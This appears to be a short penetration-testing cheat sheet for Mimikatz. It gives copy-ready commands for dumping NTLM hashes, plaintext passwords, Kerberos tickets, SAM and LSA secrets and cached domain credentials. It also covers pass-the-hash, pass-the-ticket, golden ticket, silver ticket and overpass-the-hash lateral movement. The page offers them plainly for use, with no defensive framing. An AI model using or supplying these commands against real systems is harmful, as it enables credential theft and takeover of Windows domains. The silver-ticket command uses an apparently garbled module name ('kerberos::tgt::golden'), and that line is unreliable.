# 🥝 Mimikatz Basics

Mimikatz is a powerful tool to extract plaintext credentials, hashes,  and Kerberos tickets from memory. Typically run with Administrator or SYSTEM privileges, it’s vital for Windows privilege escalation and lateral movement.

***

## Basic Commands

```batch
mimikatz.exe
privilege::debug
token::elevate
```

## Extracting Credentials

### **Get NTLM Hashes from LSASS**:

```batch
sekurlsa::logonpasswords
```

### **Dump Kerberos Tickets**

```batch
sekurlsa::tickets /export
```

### **Dump Credential Manager**

```batch
vault::cred
```

### **SAM Database**

```batch
lsadump::sam
```

### **LSA Secrets**&#x20;

```batch
lsadump::secrets
```

### **Cached Domain Credentials**

```batch
lsadump::cache
```

## Lateral Movement

### Pass-the-Hash Attack

```batch
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:<command>
```

### Pass The Ticket

```batch
kerberos::ptt <ticket.kirbi>
```

### Golden Ticket

{% code overflow="wrap" %}
```batch
kerberos::golden /user:<username> /domain:<domain> /sid:<domain SID> /krbtgt:<krbtgt hash> /id:<RID> /target:<target FQDN> /renewmax:<duration> /ptt
```
{% endcode %}

### Silver Ticket

{% code overflow="wrap" %}
```batch
kerberos::tgt::golden /user:<username> /domain:<domain> /sid:<domain SID> /service:<service> /target:<target FQDN> /rc4:<hash> /id:<RID> /ptt
```
{% endcode %}

### Overpass-the-Hash

{% code overflow="wrap" %}
```batch
sekurlsa::pth /user:<username> /domain:<domain> /aes256:<AES key> /run:<command>
```
{% endcode %}
